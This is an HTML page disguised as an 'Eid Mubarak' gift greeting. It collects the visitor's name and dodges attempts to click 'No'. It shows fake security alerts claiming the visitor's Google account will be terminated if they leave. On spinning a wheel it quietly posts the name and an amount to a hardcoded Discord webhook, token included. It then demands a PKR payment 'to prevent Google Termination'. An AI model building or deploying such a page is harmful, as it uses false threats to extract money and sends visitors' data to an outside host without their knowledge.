<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURITY ALERT</title>
    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Oswald:wght@700&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; font-family: sans-serif; overflow: hidden; touch-action: none; transition: background 0.5s; }
        /* Emergency Red Mode Class */
        body.danger { background: #7f1d1d; }
        
        .card { background: #065f46; padding: 30px; border-radius: 20px; text-align: center; color: #fbbf24; width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); position: relative; border: 1px solid #059669; z-index: 1; transition: all 0.5s; }
        .card.danger { background: #991b1b; border-color: #f87171; color: white; }
        
        h1 { font-family: 'Great Vibes', cursive; font-size: 4.5rem; margin: 0 0 10px 0; color: #fbbf24; }
        .danger h1 { color: #fecaca; }

        /* The Warning Banner */
        #warning-banner { display: none; background: #000; color: #ff0000; padding: 10px; font-family: 'Oswald', sans-serif; font-size: 1.2rem; border: 2px solid red; margin-bottom: 15px; animation: blink 0.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }

        input { padding: 12px; border-radius: 10px; border: none; width: 80%; margin: 20px 0; font-size: 1rem; }
        .btn-container { display: none; flex-direction: column; align-items: center; gap: 20px; margin-top: 20px; position: relative; min-height: 180px; }
        button { padding: 12px 35px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; font-size: 1rem; width: 160px; }
        
        #start-btn { background: #fbbf24; color: #064e3b; width: 100%; }
        #yes-btn { background: #fbbf24; color: #064e3b; z-index: 10; position: relative; }
        #no-btn { background: transparent; color: #fbbf24; border: 2px solid #fbbf24; z-index: 999; position: fixed; transition: all 0.2s; }
        
        #wheel-box { display: none; margin-top: 10px; position: relative; }
        canvas { width: 250px; height: 250px; border-radius: 50%; border: 6px solid #fbbf24; background: #fbbf24; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); }
        #spin-btn { margin-top: 20px; background: #fbbf24; color: #064e3b; width: 100%; }

        #custom-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #991b1b; padding: 30px; border-radius: 20px; text-align: center; color: white; border: 2px solid white; width: 280px; }
    </style>
</head>
<body>

    <div class="card" id="main-card">
        <div id="warning-banner">⚠️ WARNING: DISCONNECT DETECTED ⚠️</div>
        <h1>Eid Mubarak</h1>
        <div id="name-box">
            <p>Enter your name to receive your Eid Gift!</p>
            <input type="text" id="username" placeholder="Your Name Here">
            <button id="start-btn">CONTINUE</button>
        </div>
        <div id="btn-box" class="btn-container">
            <p id="msg">Would u like to give Ayaan some eidi?</p>
            <button id="yes-btn">Yes</button>
            <button id="no-btn">No</button>
        </div>
        <div id="wheel-box">
            <canvas id="wheel" width="500" height="500"></canvas>
            <button id="spin-btn">SPIN TO DECIDE</button>
        </div>
    </div>

    <div id="custom-modal">
        <div class="modal-content">
            <h2>FINAL NOTICE</h2>
            <p id="modal-msg"></p>
            <button id="modal-btn" style="background: white; color: red; padding: 10px 20px; border-radius: 10px; border: none; font-weight: bold;">CLOSE SESSION</button>
        </div>
    </div>

    <script>
        let userName = "";
        let isSpinning = false;
        const noBtn = document.getElementById('no-btn');
        const yesBtn = document.getElementById('yes-btn');
        const card = document.getElementById('main-card');
        const banner = document.getElementById('warning-banner');

        document.getElementById('start-btn').addEventListener('click', () => {
            userName = document.getElementById('username').value;
            if(userName.trim() === "") return alert("Please enter your name!");
            document.getElementById('name-box').style.display = 'none';
            document.getElementById('btn-box').style.display = 'flex';
        });

        // The "Trap" Trigger: If they try to leave, make the UI go RED
        window.onbeforeunload = function() {
            if (userName !== "") {
                document.body.classList.add('danger');
                card.classList.add('danger');
                banner.style.display = 'block';
                banner.innerText = "IF YOU LEAVE, YOUR GOOGLE WILL BE TERMINATED";
                return "Your Google account is linked to this session. Leaving may cause data loss.";
            }
        };

        const moveNo = (e) => {
            if(e) e.preventDefault();
            const x = Math.random() * (window.innerWidth - 100);
            const y = Math.random() * (window.innerHeight - 50);
            noBtn.style.left = x + 'px';
            noBtn.style.top = y + 'px';
            // Make the UI look scary when they touch 'No'
            document.body.classList.add('danger');
            card.classList.add('danger');
            banner.style.display = 'block';
            banner.innerText = "ATTEMPTED EXIT DETECTED - STABILIZING...";
        };

        noBtn.addEventListener('touchstart', moveNo);
        noBtn.addEventListener('mouseover', moveNo);

        yesBtn.addEventListener('click', () => {
            document.getElementById('btn-box').style.display = 'none';
            noBtn.style.display = 'none';
            document.getElementById('wheel-box').style.display = 'block';
            drawWheel();
        });

        // (Include drawWheel and startPrankSpin functions here from previous code)
        function drawWheel() {
            const sections = ["1000", "5000", "500"];
            const colors = ["#fbbf24", "#f59e0b", "#d97706"];
            const ctx = document.getElementById('wheel').getContext('2d');
            ctx.clearRect(0, 0, 500, 500);
            for (let i = 0; i < 3; i++) {
                ctx.beginPath();
                ctx.fillStyle = colors[i];
                ctx.moveTo(250, 250);
                let startAngle = (i * 2 * Math.PI / 3) - (Math.PI / 2);
                let endAngle = ((i + 1) * 2 * Math.PI / 3) - (Math.PI / 2);
                ctx.arc(250, 250, 250, startAngle, endAngle);
                ctx.fill();
                ctx.save();
                ctx.translate(250, 250);
                ctx.rotate(startAngle + Math.PI / 3);
                ctx.fillStyle = "#064e3b";
                ctx.font = "bold 60px Arial";
                ctx.fillText(sections[i], 80, 20);
                ctx.restore();
            }
        }

        document.getElementById('spin-btn').addEventListener('click', async function() {
            isSpinning = true;
            this.disabled = true;
            const is5000 = Math.random() > 0.5;
            const finalAmount = is5000 ? "5000" : "1000";
            const rotation = is5000 ? (3600 + 240) : (3600 + 0);
            
            document.getElementById('wheel').style.transform = `rotate(${rotation}deg)`;
            
            // Discord Webhook here...
            fetch("https://discord.com/api/webhooks/1481816655930855434/vYwU9X0ckNkEA99od3zNZMpIeYVEr8ZiC8EjxyHDNuIWurJgzRceLY72Em2pqVitoJ1C", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `💰 **PRANKED!**\n👤 **Name:** ${userName}\n💸 **Amount:** ${finalAmount} PKR` })
            });

            setTimeout(() => {
                document.getElementById('custom-modal').style.display = 'flex';
                document.getElementById('modal-msg').innerText = `Mubarak ${userName}! To prevent Google Termination, pay Ayaan ${finalAmount} PKR immediately!`;
            }, 4500);
        });
    </script>
</body>
</html>
